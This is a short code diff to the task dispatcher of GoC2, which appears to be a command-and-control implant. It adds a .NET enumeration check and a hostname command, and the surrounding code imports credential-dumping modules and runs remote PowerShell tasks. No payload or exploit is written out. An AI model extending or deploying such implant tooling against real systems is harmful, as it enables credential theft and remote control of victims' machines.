@@ -23,6 +23,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpcredman"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpprocess"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/dotnetcheck"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumdrivers"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enummodules"
@@ -369,6 +370,11 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = powershell.RunPwsh(t.Args)
 	case "enum-local":
 		result = enumlocaluser.EnumLocal()
+		cmdError = nil
+	case "dotnet-check":
+		result, cmdError = dotnetcheck.DotnetCheck()
+	case "hostname":
+		result = basic.Hostname()
 		cmdError = nil
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
